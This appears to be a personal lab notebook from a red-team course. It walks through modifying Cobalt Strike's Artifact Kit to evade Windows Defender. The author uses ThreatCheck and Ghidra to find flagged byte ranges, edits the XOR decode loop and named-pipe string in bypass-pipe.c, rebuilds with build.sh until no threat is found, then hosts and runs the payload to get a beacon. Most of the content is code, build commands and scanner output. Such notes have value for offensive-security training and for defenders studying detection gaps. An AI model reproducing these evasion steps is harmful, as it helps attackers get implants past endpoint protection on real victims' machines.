      *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8]; // 8 byte XoR
   }
```
![[Pasted image 20240216131338.png]]
modified
```powershell
   /* decode the payload with the key */
   for (int x = 0; x < length; x++) {

      char* a = (char *)ptr + x;
      char* b = (char *)buffer + x;

      // random
      GetTickCount();

      *a = *b ^ key[x % 8];
   
   }
```
![[Pasted image 20240216131621.png]]
save the file with the new modified code

rebuilt the kit, and ran threatcheck and got the same offset
```powershell
[!] Identified end of bad bytes at offset 0xE64
00000000   89 C4 31 C0 49 83 FC FF  74 3E 85 DB 7E 1F 49 89   ?Ä1AI?üÿt>?U~·I?
00000010   F9 41 89 D8 48 89 F2 4C  89 E1 48 C7 44 24 20 00   ùA?OH?òL?áHÇD$ ·
00000020   00 00 00 FF 15 CB 69 05  00 85 C0 75 10 4C 89 E1   ···ÿ·Ei··?Au·L?á
00000030   FF 15 1E 69 05 00 B8 01  00 00 00 EB 0B 8B 54 24   ÿ··i··,····ë·?T$
00000040   4C 48 01 D6 29 D3 EB C2  48 83 C4 58 5B 5E 5F 41   LH·Ö)OëAH?ÄX[^_A
00000050   5C C3 41 54 56 53 48 83  EC 20 48 8B 1D AB 2E 05   \AATVSH?ì H?·«.·
00000060   00 48 63 4B 04 E8 DA 5D  00 00 48 8B 35 A3 69 05   ·HcK·èU]··H?5£i·
00000070   00 49 89 C4 B9 00 04 00  00 FF D6 8B 53 04 4C 89   ·I?Ä1····ÿÖ?S·L?
00000080   E1 E8 2A FF FF FF 85 C0  74 EA 8B 53 04 4C 8D 43   áè*ÿÿÿ?Atê?S·L?C
00000090   08 4C 89 E1 E8 87 FD FF  FF 4C 89 E1 E8 BB 5D 00   ·L?áè?yÿÿL?áè»]·
000000A0   00 31 C0 48 83 C4 20 5B  5E 41 5C C3 48 83 EC 68   ·1AH?Ä [^A\AH?ìh
000000B0   FF 15 16 69 05 00 B9 AA  26 00 00 31 D2 41 B9 5C   ÿ··i··1ª&··1OA1\
000000C0   00 00 00 F7 F1 C7 44 24  50 5C 00 00 00 C7 44 24   ···÷ñÇD$P\···ÇD$
000000D0   48 65 00 00 00 C7 44 24  40 70 00 00 00 C7 44 24   He···ÇD$@p···ÇD$
000000E0   38 69 00 00 00 C7 44 24  30 70 00 00 00 C7 44 24   8i···ÇD$0p···ÇD$
000000F0   28 5C 00 00 00 C7 44 24  20 2E 00 00 00 41 B8 5C   (\···ÇD$ .···A,\
```





# Artifact Kit build #2
had to start by deleting the `C:\Tools\cobaltstrike\artifacts` folder so it can recreate it.
reset the `patch.c` file to original status because was getting the same bad bytes `0xe64`

back at `0xBDB`
```powershell
[!] Identified end of bad bytes at offset 0x9D0                                                                         
00000000   48 83 EC 28 48 8B 05 45  33 05 00 C7 00 01 00 00   H?ì(H?·E3··Ç····                                          
00000010   00 E8 AA FC FF FF 90 90  48 83 C4 28 C3 0F 1F 00   ·èªüÿÿ??H?Ä(A···                                          
00000020   48 83 EC 28 48 8B 05 25  33 05 00 C7 00 00 00 00   H?ì(H?·%3··Ç····                                          
00000030   00 E8 8A FC FF FF 90 90  48 83 C4 28 C3 0F 1F 00   ·è?üÿÿ??H?Ä(A···                                          
00000040   48 83 EC 28 E8 47 60 00  00 48 85 C0 0F 94 C0 0F   H?ì(èG`··H?A·?A·                                          
00000050   B6 C0 F7 D8 48 83 C4 28  C3 90 90 90 90 90 90 90   A÷OH?Ä(A???????                                           
00000060   48 8D 0D 09 00 00 00 E9  D4 FF FF FF 0F 1F 40 00   H?·····éOÿÿÿ··@·                                          
00000070   C3 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90   A???????????????                                         
00000080   48 FF E1 48 63 05 D6 6A  00 00 85 C0 7E 26 83 3D   HÿáHc·Öj··?A~&?=                                          
00000090   CF 6A 00 00 00 7E 1D 48  8B 15 06 6D 05 00 48 89   Ij···~·H?··m··H?                                          
000000A0   14 01 48 8B 15 03 6D 05  00 48 63 05 B4 6A 00 00   ··H?··m··Hc·'j··                                          
000000B0   48 89 14 01 C3 41 54 55  57 56 53 48 83 EC 40 41   H?··AATUWVSH?ì@A                                          
000000C0   B9 04 00 00 00 4C 63 E2  48 89 CF 4C 89 C5 31 C9   1····LcâH?IL?Å1É                                          
000000D0   41 B8 00 30 00 00 4C 89  E2 4C 89 E6 FF 15 22 6D   A,·0··L?âL?æÿ·"m                                          
000000E0   05 00 48 89 C3 31 C0 39  C6 7E 15 48 89 C2 83 E2   ··H?A1A9Æ~·H?A?â                                          
000000F0   07 8A 54 15 00 32 14 07  88 14 03 48 FF C0 EB E7   ·?T··2··?··HÿAëç 
```
import the new file `artifact64big.exe` into ghidra and analyzed - this is a new executable with a different bad bytes offset
`07 8A 54 15 00 32 14 07  88 14 03 48 FF C0 EB E7` is the hex string used
![[Pasted image 20240216134639.png]]
`VirtualAlloc` & `CreateThread` & `VirtualProtect` being used
![[Pasted image 20240216134725.png]]
this is the exact same as in the walkthrough this time with a different executable.

Original code 
line 114 start
```powershell
   /* decode the payload with the key */
   for (int x = 0; x < length; x++) {
      *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8]; // 8 byte XoR
   }
```
modified
```powershell
   /* decode the payload with the key */
   for (int x = 0; x < length; x++) {

      char* a = (char *)ptr + x;
      char* b = (char *)buffer + x;

      // random
      GetTickCount();

      *a = *b ^ key[x % 8];
   }
```
click `save` in `VScode`

rebuild the kit in `WSL`
```powershell
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobalt
strike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact>
```
threatcheck scan in `powershell session`
`C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64big.exe`
```powershell
[!] Identified end of bad bytes at offset 0xC85
00000000   C4 31 C0 49 83 FC FF 74  3E 85 DB 7E 1F 49 89 F9   Ä1AI?üÿt>?U~·I?ù
00000010   41 89 D8 48 89 F2 4C 89  E1 48 C7 44 24 20 00 00   A?OH?òL?áHÇD$ ··
00000020   00 00 FF 15 07 6B 05 00  85 C0 75 10 4C 89 E1 FF   ··ÿ··k··?Au·L?áÿ
00000030   15 72 6A 05 00 B8 01 00  00 00 EB 0B 8B 54 24 4C   ·rj··,····ë·?T$L
00000040   48 01 D6 29 D3 EB C2 48  83 C4 58 5B 5E 5F 41 5C   H·Ö)OëAH?ÄX[^_A\
00000050   C3 41 54 56 53 48 83 EC  20 48 8B 1D 2B 30 05 00   AATVSH?ì H?·+0··
00000060   48 63 4B 04 E8 3A 5D 00  00 48 8B 35 CF 6A 05 00   HcK·è:]··H?5Ij··
00000070   49 89 C4 B9 00 04 00 00  FF D6 8B 53 04 4C 89 E1   I?Ä1····ÿÖ?S·L?á
00000080   E8 2A FF FF FF 85 C0 74  EA 8B 53 04 4C 8D 43 08   è*ÿÿÿ?Atê?S·L?C·
00000090   4C 89 E1 E8 68 FD FF FF  4C 89 E1 E8 1B 5D 00 00   L?áèhyÿÿL?áè·]··
000000A0   31 C0 48 83 C4 20 5B 5E  41 5C C3 48 83 EC 68 FF   1AH?Ä [^A\AH?ìhÿ
000000B0   15 52 6A 05 00 B9 AA 26  00 00 31 D2 41 B9 5C 00   ·Rj··1ª&··1OA1\·
000000C0   00 00 F7 F1 C7 44 24 50  5C 00 00 00 C7 44 24 48   ··÷ñÇD$P\···ÇD$H
000000D0   65 00 00 00 C7 44 24 40  70 00 00 00 C7 44 24 38   e···ÇD$@p···ÇD$8
000000E0   69 00 00 00 C7 44 24 30  70 00 00 00 C7 44 24 28   i···ÇD$0p···ÇD$(
000000F0   5C 00 00 00 C7 44 24 20  2E 00 00 00 41 B8 5C 00   \···ÇD$ .···A,\·
```
![[Pasted image 20240216135332.png]]
different offset found.

reload the new binary into `ghidra` before analyzing the new offset!
reanalyze the file in `ghidra`
`5C 00 00 00 C7 44 24 20  2E 00 00 00 41 B8 5C 00` returned our GetTickCount

![[Pasted image 20240216135818.png]]

# WAS HAVING ISSUES BECAUSE YOU NEED TO OPEN THE ENTIRE SRC-COMMON FOLDER IN VSCODE

once opened the entire folder and searching for the `%c%c` string it populated in the `bypass-pipe.c` file

![[Pasted image 20240216140455.png]]original 
```powershell
  sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```
modified
- remember to take out the additional parenthesis that is shown in the screenshot below
```powershell
sprintf(pipename, "%c%c%c%c%c%c%c%c%cbugswashere\\m", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```
![[Pasted image 20240216140649.png]]save the file and rebuild in `WSL`
```powershell
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact [SIGINT]> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Too
ls/cobaltstrike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```
run `threatcheck` - nice .69s
```powershell
PS C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug> C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64big.exe
[+] No threat found!
[*] Run time: 0.69s
```
![[Pasted image 20240216140943.png]]
load new aggressor script into `cobaltstrike`
![[Pasted image 20240216141159.png]]
generate the new payloads
![[Pasted image 20240216141255.png]]
host the new artifact kit `http_x64.exe`
![[Pasted image 20240216143926.png]]
download the file and move to `C:\windows\tasks` to be able to execute the file
![[Pasted image 20240216144008.png]]
double click and boom, initial beacon access
![[Pasted image 20240216144046.png]]